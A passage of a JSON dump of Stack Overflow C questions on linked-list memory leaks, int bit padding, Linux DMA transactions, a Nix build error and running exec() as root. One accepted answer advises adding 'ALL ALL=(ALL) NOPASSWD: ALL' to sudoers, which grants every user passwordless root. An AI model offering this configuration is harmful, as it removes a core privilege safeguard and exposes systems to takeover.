"reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 501, "favorite_count": 0, "accepted_answer_id": 55016565, "answer_count": 3, "score": 0, "last_activity_date": 1551856823, "creation_date": 1551848593, "last_edit_date": 1551849767, "question_id": 55015887, "link": "https://stackoverflow.com/questions/55015887/memory-leaks-in-doubly-linked-list", "title": "Memory leaks in doubly linked list", "body": "<p>I'm pretty new to C programming.</p>\n\n<p>I have an assignment in which we are supposed to create a doubly linked list of integers, and write some functions to manipulate them. We are being asked to prevent memory leaks, but I'm not really sure how to do that. </p>\n\n<p>I have to <code>malloc</code>  a bunch of times in order to create and store nodes when making the linked list, and I'm pretty sure it's not a good idea to <code>malloc</code> enough space for a node and then free the pointer to it in the same place. </p>\n\n<p>Therefore, my best guess is that I should free all nodes in the main function, when I will have printed their contents to the screen and they are no longer needed. I tried to implement a <code>kill</code> function that takes as input a reference <code>head</code> to the first node in the list, and which iterates over the nodes, freeing them as they go.</p>\n\n<p>I went as far as installing valgrind to try and see if there were any memory leaks, and it looks like there are still some. I have no idea where they are coming from or how to fix the issue.</p>\n\n<p>Here is the whole code:</p>\n\n<pre><code> #include &lt;stdio.h&gt;\n #include &lt;string.h&gt;\n #include &lt;stdlib.h&gt;\n\n typedef struct Node{\n     int data;\n     struct Node *next;\n     struct Node *previous;\n }Node;\n\n void print_dll(Node *head){\n     Node *curr = head;\n     while(curr != NULL){\n         printf(\"%d\\t\", curr-&gt;data);\n         curr = curr-&gt;next;\n     }\n     puts(\" \");\n }\n\nNode* create_dll_from_array(int array [], int arrSize){\n     //this is a function that creates a doubly linked list \n     //with the contents of the array\n     Node* current = (Node *) malloc (sizeof(Node * ));\n     current-&gt;data = array[arrSize-1];\n     current -&gt; next = NULL;\n\n     for(int i = 2; i &lt;= arrSize; i++){\n         //create a new node\n         Node * temp = (Node*)malloc(sizeof(Node*));\n         //I would like the dll to be in the same order as the array, I        guess it isn't strictly necessary\n         temp -&gt;data = array[arrSize-i];\n         temp -&gt; next = current;\n         current-&gt; previous = temp;\n         //now make temp the current\n         current = temp;\n     }\n     current-&gt; previous = NULL; \n     return current;\n }\n\n  void insert_after(Node* head, int valueToInsertAfter, int valueToInsert ){\n     if(head != NULL){\n         Node * current = head;\n\n         while(current-&gt; data != valueToInsertAfter){\n         //this while loop brings 'current' to the end of the list if\n         //the searched value is not there\n             if(current-&gt; next != NULL){\n                 current = current-&gt;next;\n             }else{\n                 break;\n             }\n         }\n         //after exiting this loop, the current pointer is pointing\n         //either to the last element of the dll or to the element \n         //we need to insert after\n\n         Node *new = (Node *) malloc (sizeof(Node *));\n         new-&gt;data = valueToInsert;\n         new-&gt;next = current-&gt;next;\n         new-&gt;previous = current;\n         if(current-&gt;next != NULL){\n             (current-&gt;next)-&gt;previous = new;\n         }\n         current-&gt;next = new;\n     }\n }\n\n void delete_element(Node* head, int valueToBeDeleted){\n     //work in progress\n }\n void kill(Node *head){\n //this is my attempt at freeing all the nodes in the doubly linked list\n     Node *current;\n     while(head!=NULL){\n         current = head;\n         head = head-&gt;next;\n         free(head);\n     }\n }\n int main(){\n     int array [5] = {11, 2, 7, 22, 4};\n     Node *head;\n\n     /*Question 1*/\n     //creates a doubly linked list from the array below\n     head = create_dll_from_array(array, 5); ///size of the array is 5\n\n     /* Question 2 */\n    // print_dll(head);\n\n     /*Question 3*/\n     // to insert 13 after the first appearance of 7\n     insert_after(head, 7, 13);\n     print_dll(head);\n     //to insert 29 after first appearance of 21\n     insert_after(head, 21, 29);\n     print_dll(head);\n\n     /*Question 6*/\n     //create a function to free the whole list\n\n     kill(head);\n\n\n     return 0;\n\n }\n</code></pre>\n\n<p>The main function here is given to us by the prof, we have to build out function around it. </p>\n\n<p>I don't know why this is still appearing to lead to memory leaks, and if I', being honest, I don't really know where else they could occur. As far as I know, I need to keep all the memory until almost the last minute.</p>\n\n<p>Please help,  I'm pretty lost here.</p>\n\n<p>Thank you!</p>\n"}, {"tags": ["c", "bit"], "comments": [{"owner": {"reputation": 4562, "user_id": 9254539, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4b45538511384660bfaef5092e30b7ea?s=128&d=identicon&r=PG&f=1", "display_name": "BessieTheCookie", "link": "https://stackoverflow.com/users/9254539/bessiethecookie"}, "edited": false, "score": 3, "creation_date": 1551848428, "post_id": 55015797, "comment_id": 96785708, "body": "How would you pad an integer without changing its value? Think about it."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "reply_to_user": {"reputation": 4562, "user_id": 9254539, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4b45538511384660bfaef5092e30b7ea?s=128&d=identicon&r=PG&f=1", "display_name": "BessieTheCookie", "link": "https://stackoverflow.com/users/9254539/bessiethecookie"}, "edited": false, "score": 0, "creation_date": 1551862241, "post_id": 55015797, "comment_id": 96791534, "body": "@FeiXiang In theory, signed integers in C can contain padding bits, in case of exotic number formats (1&#39;s compl, signed magnitude). But that scenario is not even worth pondering, since real world computers use 2&#39;s complement."}], "answers": [{"comments": [{"owner": {"reputation": 384, "user_id": 11157641, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ed6c39e56bbe90080366b0456e5daa4f?s=128&d=identicon&r=PG&f=1", "display_name": "Yuri Albuquerque", "link": "https://stackoverflow.com/users/11157641/yuri-albuquerque"}, "edited": false, "score": 0, "creation_date": 1551848573, "post_id": 55015820, "comment_id": 96785754, "body": "Thanks, I thought it would be that way, but I was in doubt if the bits would be filled left or right. Another thing, coming out of the scope a bit, what would be the real use of bitwise?"}, {"owner": {"reputation": 1211, "user_id": 1509809, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f2be13fa9f78f64b8f3ca00f7d1c988d?s=128&d=identicon&r=PG", "display_name": "thuyein", "link": "https://stackoverflow.com/users/1509809/thuyein"}, "edited": false, "score": 0, "creation_date": 1551850039, "post_id": 55015820, "comment_id": 96786171, "body": "If I&#39;m not wrong, your doubt about &quot;filled left or right&quot; depends on the endianness of the system. Bitwise operations can be used to set binary flags, at least that&#39;s how I see them being used."}, {"owner": {"reputation": 26723, "user_id": 995714, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/w1393.jpg?s=128&g=1", "display_name": "phuclv", "link": "https://stackoverflow.com/users/995714/phuclv"}, "reply_to_user": {"reputation": 1211, "user_id": 1509809, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f2be13fa9f78f64b8f3ca00f7d1c988d?s=128&d=identicon&r=PG", "display_name": "thuyein", "link": "https://stackoverflow.com/users/1509809/thuyein"}, "edited": false, "score": 0, "creation_date": 1551857452, "post_id": 55015820, "comment_id": 96789051, "body": "@ThuYeinTun the bits are always filled to the most significant part. Just like in decimal we can write 0000123 for a 7-digit number. If we write zeros on the right then how can we differentiate between 123000 (which is 123) and 123000 (which is the real 123000)? In C we deal with <b>values</b>, not how the value is stored in memory which is what endianness about"}], "tags": [], "owner": {"reputation": 124806, "user_id": 121747, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/9fcebb68b105446c0d9eebbce1146044?s=128&d=identicon&r=PG&f=1", "display_name": "Jack", "link": "https://stackoverflow.com/users/121747/jack"}, "is_accepted": true, "score": 0, "last_activity_date": 1551848108, "creation_date": 1551848108, "answer_id": 55015820, "question_id": 55015797, "link": "https://stackoverflow.com/questions/55015797/bits-of-the-primitive-type-in-c/55015820#55015820", "title": "Bits of the primitive type in C", "body": "<p>All leading bits will be set to <code>0</code>, otherwise the value wouldn't be <code>5</code>. A bit, in today computers, has only two states so if it's not <code>0</code> then it's <code>1</code> which would cause the value stored to be different. So assuming 32 bits you have that</p>\n\n<pre><code>5 == 0b00000000 00000000 00000000 00000101\n5 == 0x00000005\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 384, "user_id": 11157641, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ed6c39e56bbe90080366b0456e5daa4f?s=128&d=identicon&r=PG&f=1", "display_name": "Yuri Albuquerque", "link": "https://stackoverflow.com/users/11157641/yuri-albuquerque"}, "edited": false, "score": 0, "creation_date": 1551849204, "post_id": 55015821, "comment_id": 96785930, "body": "I ended up accepting the friend&#39;s response above, because he answered first, but thank you for your response too."}], "tags": [], "owner": {"reputation": 1508, "user_id": 9129885, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/elHKK.jpg?s=128&g=1", "display_name": "Shubham Chopra", "link": "https://stackoverflow.com/users/9129885/shubham-chopra"}, "is_accepted": false, "score": 0, "last_activity_date": 1551848108, "creation_date": 1551848108, "answer_id": 55015821, "question_id": 55015797, "link": "https://stackoverflow.com/questions/55015797/bits-of-the-primitive-type-in-c/55015821#55015821", "title": "Bits of the primitive type in C", "body": "<p>The remaining bits are stored with 0.</p>\n\n<p>int a = 356; </p>\n\n<p>Now let us convert it to binary.</p>\n\n<pre><code> 1     0    1     1     0   0   1   0   0\n</code></pre>\n\n<p>Now you get 9 bit number. Since int allocates 32 bits, fill the remaining 23 bits with 0.</p>\n\n<p>So the value stored in memory is</p>\n\n<pre><code>         00000000 00000000 00000001 01100100\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "is_accepted": false, "score": 0, "last_activity_date": 1551862174, "creation_date": 1551862174, "answer_id": 55018913, "question_id": 55015797, "link": "https://stackoverflow.com/questions/55015797/bits-of-the-primitive-type-in-c/55018913#55018913", "title": "Bits of the primitive type in C", "body": "<p>The type you have picked determines how large the integer is, not the value you store inside the variable. </p>\n\n<p>If we assume that <code>int</code> is 32 bits on your system, then the value <code>5</code> will be expressed as a 32 bit number. Which is <code>0000000000000000000000000101</code> binary or <code>0x00000005</code> hex. If the other bits had any other values, it would no longer be the number 5, 32 bits large.</p>\n"}], "owner": {"reputation": 384, "user_id": 11157641, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ed6c39e56bbe90080366b0456e5daa4f?s=128&d=identicon&r=PG&f=1", "display_name": "Yuri Albuquerque", "link": "https://stackoverflow.com/users/11157641/yuri-albuquerque"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 95, "favorite_count": 0, "accepted_answer_id": 55015820, "answer_count": 3, "score": 3, "last_activity_date": 1551862174, "creation_date": 1551847901, "question_id": 55015797, "link": "https://stackoverflow.com/questions/55015797/bits-of-the-primitive-type-in-c", "title": "Bits of the primitive type in C", "body": "<p>Well, I'm starting my C studies and I was left with the following question, how are the bits of the primitive types filled in, for example, the int type, for example, has 4 bytes, that is 32 bits, which fits up to 4294967296. But if for example , I use a value that takes only 1 byte, how do the other bits stay?</p>\n\n<pre><code>    #include &lt;stdio.h&gt;\n\n    int main(void) {\n\n        int x = 5; // 101 how the rest of the bits are filled\n                   // which was not used?\n         return 0;\n    }\n</code></pre>\n"}, {"tags": ["c", "linux", "linux-device-driver", "dma"], "answers": [{"comments": [{"owner": {"reputation": 984, "user_id": 577563, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bb5482b3806c6fe891e6270b99597a71?s=128&d=identicon&r=PG", "display_name": "notthetup", "link": "https://stackoverflow.com/users/577563/notthetup"}, "edited": false, "score": 0, "creation_date": 1551866095, "post_id": 55017390, "comment_id": 96793778, "body": "Indeed. But ideally, these would be done by the DMA Engine implementation. I&#39;m just not sure if the <code>dma_desc</code> that returned from the <code>dmaengine_prep_slave_single</code> can be reused."}], "tags": [], "owner": {"reputation": 41, "user_id": 9995073, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d16b3b604803b21a498da2bd3583b224?s=128&d=identicon&r=PG&f=1", "display_name": "Cat22", "link": "https://stackoverflow.com/users/9995073/cat22"}, "is_accepted": false, "score": 1, "last_activity_date": 1551855848, "creation_date": 1551855848, "answer_id": 55017390, "question_id": 55015366, "link": "https://stackoverflow.com/questions/55015366/resubmitting-dma-engine-transactions/55017390#55017390", "title": "Resubmitting DMA Engine transactions", "body": "<p>You need to at least re-init the memory source address, destination address, and length registers as they will change over the course of the DMA transaction. I think it would be just as fast to just redo everything each time - its not very much to setup and thus the time spent is minuscule.</p>\n"}, {"comments": [{"owner": {"reputation": 984, "user_id": 577563, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bb5482b3806c6fe891e6270b99597a71?s=128&d=identicon&r=PG", "display_name": "notthetup", "link": "https://stackoverflow.com/users/577563/notthetup"}, "edited": false, "score": 0, "creation_date": 1551940212, "post_id": 55035321, "comment_id": 96826285, "body": "Yup. Exactly what I wanted to confirm. Thanks! Also thanks for linking to an example from the kernel which I can follow."}], "tags": [], "owner": {"reputation": 577, "user_id": 656347, "user_type": "registered", "accept_rate": 0, "profile_image": "https://i.stack.imgur.com/f15mA.jpg?s=128&g=1", "display_name": "Sanchayan Maity", "link": "https://stackoverflow.com/users/656347/sanchayan-maity"}, "is_accepted": true, "score": 1, "last_activity_date": 1551928904, "last_edit_date": 1551928904, "creation_date": 1551927165, "answer_id": 55035321, "question_id": 55015366, "link": "https://stackoverflow.com/questions/55015366/resubmitting-dma-engine-transactions/55035321#55035321", "title": "Resubmitting DMA Engine transactions", "body": "<p>Steps 1 and 2 need not be repeated. Steps 3 to 5 can be repeated for multiple transactions. For example, see the patch <a href=\"https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=90ba37033cb94207e97c4ced9be575770438213b\" rel=\"nofollow noreferrer\">here</a>. <strong><em>dspi_dma_xfer</em></strong> function can call <strong><em>dspi_next_xfer_dma_submit</em></strong> multiple times and steps 3 to 5 are redone. Since you want the <strong><em>dma_addr_t buf</em></strong> to be the same, as far as I understand this is what you want.</p>\n"}], "owner": {"reputation": 984, "user_id": 577563, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bb5482b3806c6fe891e6270b99597a71?s=128&d=identicon&r=PG", "display_name": "notthetup", "link": "https://stackoverflow.com/users/577563/notthetup"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 235, "favorite_count": 0, "accepted_answer_id": 55035321, "answer_count": 2, "score": 1, "last_activity_date": 1551928904, "creation_date": 1551844947, "question_id": 55015366, "link": "https://stackoverflow.com/questions/55015366/resubmitting-dma-engine-transactions", "title": "Resubmitting DMA Engine transactions", "body": "<p>I'm writing a custom high-speed Linux SPI driver for an embedded SoC. To send data to the SPI peripheral (<code>DMA_MEM_TO_DEV</code>) I'm the Linux DMA Engine API.</p>\n\n<p><a href=\"https://www.kernel.org/doc/Documentation/dmaengine/client.txt\" rel=\"nofollow noreferrer\">https://www.kernel.org/doc/Documentation/dmaengine/client.txt</a></p>\n\n<p>Based on the documentation, the steps for setting up and executing a DMA transaction are:</p>\n\n<ol>\n<li>Allocate a DMA slave channel : <code>dma_request_channel</code></li>\n<li>Set slave and controller specific parameters : <code>dmaengine_slave_config</code></li>\n<li>Get a descriptor for tranesaction : <code>dmaengine_prep_slave_single</code></li>\n<li>Submit the transaction : <code>dmaengine_submit</code></li>\n<li>Issue pending requests and wait for callback notification : <code>dma_async_issue_pending</code></li>\n</ol>\n\n<p>I have this working for single DMA transactions. But I need to send multiple DMA transactions from the same memory location (<code>dma_addr_t buf</code>) of the same size (<code>size_t len</code>) based on some hardware flow control (GPIOs).</p>\n\n<p>For starters, I tried to redo step 1-5 for every DMA transaction. So every time the flow control GPIO IRQ triggers, I reallocate a DMA slave channel, re-set the slave and controller specific parameters, ...</p>\n\n<p>This seems to work too, but I am not sure if it's the most efficient way.</p>\n\n<p>I am wondering if I can just re-submit the transaction again (<code>dmaengine_submit</code>) and issue again (<code>dma_async_issue_pending</code>)? Would this be more efficient?</p>\n\n<p>I can't seem to find any information on how to resubmit the exact same DMA request anywhere in the kernel documentation.</p>\n"}, {"tags": ["c", "macos", "nix"], "answers": [{"comments": [{"owner": {"reputation": 13948, "user_id": 283342, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/e3ef6dbec3a443e7cda5b5624311ca08?s=128&d=identicon&r=PG&f=1", "display_name": "Adrian", "link": "https://stackoverflow.com/users/283342/adrian"}, "edited": false, "score": 1, "creation_date": 1551993608, "post_id": 55022877, "comment_id": 96855735, "body": "I&#39;m using OS X 10.13 and nixpkgs 19.09."}], "tags": [], "owner": {"reputation": 4222, "user_id": 428586, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yHNYS.jpg?s=128&g=1", "display_name": "Robert Hensing", "link": "https://stackoverflow.com/users/428586/robert-hensing"}, "is_accepted": false, "score": 0, "last_activity_date": 1551874362, "creation_date": 1551874362, "answer_id": 55022877, "question_id": 55015358, "link": "https://stackoverflow.com/questions/55015358/how-to-use-nix-to-build-software-that-uses-time-h-on-macos/55022877#55022877", "title": "How to use Nix to build software that uses time.h on macOS", "body": "<p>This seems to be a compile error that was fixed in OS X since 10.11.6 that you're using in your derivation.</p>\n\n<p>Upgrading to a newer nixpkgs should solve the issue. Nixpkgs 18.09 should be sufficient.</p>\n"}], "owner": {"reputation": 13948, "user_id": 283342, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/e3ef6dbec3a443e7cda5b5624311ca08?s=128&d=identicon&r=PG&f=1", "display_name": "Adrian", "link": "https://stackoverflow.com/users/283342/adrian"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 70, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1551874362, "creation_date": 1551844874, "question_id": 55015358, "link": "https://stackoverflow.com/questions/55015358/how-to-use-nix-to-build-software-that-uses-time-h-on-macos", "title": "How to use Nix to build software that uses time.h on macOS", "body": "<p>I have some software written in C. It compiles fine, but when I try to package it as a Nix package, the compiler emits the error</p>\n\n<blockquote>\n  <p>unknown type name 'clockid_t'; did you mean 'clock_t'?</p>\n</blockquote>\n\n<p>Here is a MCVE:</p>\n\n<p>default.nix:</p>\n\n<pre><code>with import &lt;nixpkgs&gt; {};\nstdenv.mkDerivation {\n  name = \"asdf\";\n  src = lib.cleanSource ./.;\n}\n</code></pre>\n\n<p>main.c:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;time.h&gt;\n\nclockid_t x;\n\nint main() { return 0; }\n</code></pre>\n\n<p>makefile:</p>\n\n<pre><code>all:\n    cc main.c -o main\n</code></pre>\n\n<p>Putting these files in a directory and executing <code>nix-build</code> produces this output:</p>\n\n<pre><code>these derivations will be built:\n  /nix/store/8djs648bj3bqrn0bz51hmf79wdifks2b-asdf.drv\nbuilding '/nix/store/8djs648bj3bqrn0bz51hmf79wdifks2b-asdf.drv'...\nunpacking sources\nunpacking source archive /nix/store/zm8c46i44hp2gr9gc7n41f3vg02jh2v5-asdf\nsource root is asdf\npatching sources\nconfiguring\nno configure script, doing nothing\nbuilding\nbuild flags: SHELL=/nix/store/g9cis4hsnzcjkzfa77nif7kzq9bsqmpg-bash-4.4-p23/bin/bash\ncc main.c -o main\nmain.c:4:1: error: unknown type name 'clockid_t'; did you mean 'clock_t'?\nclockid_t x;\n^~~~~~~~~\nclock_t\n/nix/store/l77bg1s15f0wgjf4c12fc29ghvjbswwy-Libsystem-osx-10.11.6/include/sys/_types/_clock_t.h:30:33: note: 'clock_t' declared here\ntypedef __darwin_clock_t        clock_t;\n                                ^\n1 error generated.\nmake: *** [makefile:2: all] Error 1\nbuilder for '/nix/store/8djs648bj3bqrn0bz51hmf79wdifks2b-asdf.drv' failed with exit code 2\nerror: build of '/nix/store/8djs648bj3bqrn0bz51hmf79wdifks2b-asdf.drv' failed\n</code></pre>\n\n<p>But when I simply run <code>make</code> there is no error. How can I fix this?</p>\n"}, {"tags": ["c", "permissions", "exec", "root", "daemon"], "comments": [{"owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 0, "creation_date": 1551849225, "post_id": 55014899, "comment_id": 96785936, "body": "If you could write a C program which fired up a root process without any security verification, then there wouldn&#39;t be much point having root privileges, right? If your program requires root privileges to work correctly, document that fact and let the user <code>sudo</code> tour peogram."}, {"owner": {"reputation": 301, "user_id": 4940535, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/Jvwwz.png?s=128&g=1", "display_name": "Benjamin", "link": "https://stackoverflow.com/users/4940535/benjamin"}, "reply_to_user": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 0, "creation_date": 1551850797, "post_id": 55014899, "comment_id": 96786396, "body": "The initial process and thread that called <code>fork()</code> is ran using <code>sudo</code>. It seems these privileges are not passed when exec function is called."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1551852322, "post_id": 55014899, "comment_id": 96786965, "body": "Can you make your program SUID <code>root</code>?  If so, that works cleanly."}, {"owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 0, "creation_date": 1551879643, "post_id": 55014899, "comment_id": 96801928, "body": "@benjamin: <code>execve</code> does not drop privileges. What evidence do you have that it is? If you start your executable as root, any children will also be run as root, so you should not need to use <code>sudo</code> in the exec."}, {"owner": {"reputation": 301, "user_id": 4940535, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/Jvwwz.png?s=128&g=1", "display_name": "Benjamin", "link": "https://stackoverflow.com/users/4940535/benjamin"}, "edited": false, "score": 0, "creation_date": 1551886944, "post_id": 55014899, "comment_id": 96806577, "body": "The main process as well as the child process I want to create both need read access to <code>&#47;dev&#47;mem</code>. It seems the main process is able to read fine, but the child process cannot. I will get an access denied /dev/mem error"}, {"owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 0, "creation_date": 1551888545, "post_id": 55014899, "comment_id": 96807578, "body": "@benjamin: Works fine with my test. (I exec&#39;d a <code>dd if=&#47;dev&#47;mem ...</code>, and it cheerfully read /dev/mem when I sudo&#39;d my main program.) I don&#39;t mind pursuing this further, but it would be a different question, and you&#39;d need to include an <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>."}, {"owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 0, "creation_date": 1551897974, "post_id": 55014899, "comment_id": 96812849, "body": "Just to be clear, <code>&#47;dev&#47;mem</code> is usually restricted to memory mapped I/O these days. I tested it on the zero page, which is still accessible (to root)."}, {"owner": {"reputation": 301, "user_id": 4940535, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/Jvwwz.png?s=128&g=1", "display_name": "Benjamin", "link": "https://stackoverflow.com/users/4940535/benjamin"}, "edited": false, "score": 0, "creation_date": 1551898897, "post_id": 55014899, "comment_id": 96813242, "body": "Ok so I found the issue. After reading some replies, I took another look at the library I was using that needed access to <code>&#47;dev&#47;mem</code> in the first place. It seems it would voluntarily drop privileges after initializing. This would explain my problem and am sure I can work around it."}], "answers": [{"tags": [], "owner": {"reputation": 3126, "user_id": 2955790, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/vShcC.png?s=128&g=1", "display_name": "Duck Dodgers", "link": "https://stackoverflow.com/users/2955790/duck-dodgers"}, "is_accepted": true, "score": 1, "last_activity_date": 1551869551, "creation_date": 1551869551, "answer_id": 55021308, "question_id": 55014899, "link": "https://stackoverflow.com/questions/55014899/how-to-run-an-exec-function-as-root-and-non-interactive/55021308#55021308", "title": "How to run an exec() function as root and non-interactive?", "body": "<p>To test the premise of your question that,</p>\n\n<blockquote>\n  <p><em>\"It seems that privileges are not passed from the main thread once an exec function is called.\"</em></p>\n</blockquote>\n\n<p>I wrote the following test code,</p>\n\n<pre><code>#include &lt;unistd.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;errno.h&gt;\n\nint main() {\n//    printf(\"starting\");\n    char sudo[]=\"/usr/bin/sudo\";\n    char pbin[]=\"mkdir\";\n\n//    printf(\"running test: %s %s\",sudo,pbin);\n    errno=0;\n\n    if (fork() == 0) {\n        int res = execl(sudo,sudo,pbin,\"/bin/child\",(char *)NULL);\n//        printf(\"res:%d\", res);\n    }\n    else {\n        sleep(2);\n        int res = execl(sudo,sudo,pbin,\"/bin/parent\",(char *)NULL);\n//        printf(\"res:%d\", res);\n    }\n}\n</code></pre>\n\n<p>And to my surprise, it worked without a problem, giving the following output:</p>\n\n<pre><code>$ sudo rm /bin/parent -rf ; sudo rm -rf /bin/child/\n$ ls /bin/child/ -la\nls: cannot access '/bin/child/': No such file or directory\n$ ls /bin/parent/ -la\nls: cannot access '/bin/parent/': No such file or directory\n\n$ gcc main.c\n$ sudo ./a.out\n\n$ ls /bin/parent -la\ntotal 8 drwxr-xr-x 2 root root 4096 Mar  6 11:42 . \ndrwxr-xr-x 4 root root 4096 Mar  6 11:42 ..\n$ ls /bin/child -la \ntotal 8 drwxr-xr-x 2 root root 4096 Mar  6 11:42 .\ndrwxr-xr-x 4 root root 4096 Mar  6 11:42 ..\n</code></pre>\n\n<p>As you can see there is a directory created by the parent process as well as the child process with root privileges.</p>\n\n<hr>\n\n<p>Which got me thinking that your problem is in fact something else, as you state:</p>\n\n<blockquote>\n  <p><em>\"The sudo command prompts for daemon's password. I am looking for non-interactive way to run the process as root. Is there anyway to do this short of removing Daemon's password?\"</em></p>\n</blockquote>\n\n<p>What you really want is a <strong>password-less sudo</strong>, which can be obtained by running</p>\n\n<pre><code>sudo visudo\n</code></pre>\n\n<p>and then adding the line:</p>\n\n<pre><code>ALL     ALL=(ALL) NOPASSWD: ALL\n</code></pre>\n\n<p>making your sudoers file looking like this.</p>\n\n<pre><code>#\n# This file MUST be edited with the 'visudo' command as root.\n#\n# Please consider adding local content in /etc/sudoers.d/ instead of\n# directly modifying this file.\n#\n# See the man page for details on how to write a sudoers file.\n#\nDefaults    env_reset\nDefaults    mail_badpass\nDefaults    secure_path=\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin\"\n\n# Host alias specification\n\n# User alias specification\n\n# Cmnd alias specification\n\n# User privilege specification\nroot    ALL=(ALL:ALL) ALL\n\n# Members of the admin group may gain root privileges\n%admin ALL=(ALL) ALL\n\n# Allow members of group sudo to execute any command\n%sudo   ALL=(ALL:ALL) ALL\n\nALL ALL=(ALL) NOPASSWD: ALL\n# See sudoers(5) for more information on \"#include\" directives:\n\n#includedir /etc/sudoers.d\n</code></pre>\n"}], "owner": {"reputation": 301, "user_id": 4940535, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/Jvwwz.png?s=128&g=1", "display_name": "Benjamin", "link": "https://stackoverflow.com/users/4940535/benjamin"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 648, "favorite_count": 0, "accepted_answer_id": 55021308, "answer_count": 1, "score": 0, "last_activity_date": 1551869551, "creation_date": 1551841589, "question_id": 55014899, "link": "https://stackoverflow.com/questions/55014899/how-to-run-an-exec-function-as-root-and-non-interactive", "title": "How to run an exec() function as root and non-interactive?", "body": "<p>I am looking to <code>fork()</code> and exec with root privlages. It seems that privileges are not passed from the main thread once an exec function is called.</p>\n\n<p>Now I have seen the post <a href=\"https://stackoverflow.com/questions/48791210/c-programming-execute-another-program-with-sudo-privileges\">here</a> that describes how to run a process as root, but when I try their solution..</p>\n\n<pre><code>char sudo[]=\"/usr/bin/sudo\";\nchar pbin[]=\"/usr/local/bin/puppet\";\nexecl(sudo,sudo,pbin,(char *)NULL);\n</code></pre>\n\n<p>The <code>sudo</code> command prompts for daemon's password. I am looking for non-interactive way to run the process as root. Is there anyway to do this short of removing Daemon's password?</p>\n"}, {"tags": ["c", "language-lawyer", "c89", "flexible-array-member"], "comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1551840847, "post_id": 55014685, "comment_id": 96783937, "body": "Note: &quot;accessing the second element of data.&quot; --&gt; There is no 2nd element (of type <code>struct Array</code>) of an <i>array</i> here.  &quot;other than the first element of the data array&quot; does not apply 